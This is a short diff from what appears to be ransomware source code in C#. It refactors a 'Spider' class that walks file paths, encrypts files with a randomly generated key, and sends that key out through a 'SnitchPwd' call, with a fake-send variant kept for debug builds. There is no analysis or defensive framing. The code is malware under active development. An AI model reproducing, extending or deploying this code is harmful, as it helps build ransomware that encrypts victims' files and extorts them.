@@ -31,22 +31,22 @@ namespace g0nnaL4ugh
    
 	public class Spider
 	{
-        string[] initialPaths;
+		PathUtil pathUtil;
         List<Node> nodes;
         Encrypter encrypter;
         Decrypter decrypter;
         private byte[] pwd;
       
-        public Spider(string[] paths, Encrypter encrypter)
+		public Spider(PathUtil pathUtil, Encrypter encrypter)
         {
-            this.initialPaths = paths;
+			this.pathUtil = pathUtil;
             this.encrypter = encrypter;
             this.nodes = new List<Node>();
         }
 
-        public Spider(string[] paths, Decrypter decrypter, byte[] pwd)
+		public Spider(PathUtil pathUtil, Decrypter decrypter, byte[] pwd)
         {
-            this.initialPaths = paths;
+			this.pathUtil = pathUtil;
             this.decrypter = decrypter;
             this.nodes = new List<Node>();
             this.pwd = pwd;
@@ -96,13 +96,13 @@ namespace g0nnaL4ugh
                 this.pwd = this.encrypter.GenerateRandomPrivateKey();
                 string password = Utilities.ConvertBytes2B64(this.pwd);
 #if DEBUG
-                Sender.FakeSnitchPwd(password);
+				Sender.FakeSnitchPwd(password, this.pathUtil, this.encrypter);
 #else
-                Sender.SnitchPwd(password);
+				Sender.SnitchPwd(password,this.pathUtil, this.encrypter);
 #endif
             }
                      
-            foreach (string path in this.initialPaths)
+			foreach (string path in this.pathUtil.Start)
             {
 #if DEBUG
                 Stopwatch watch = new Stopwatch();
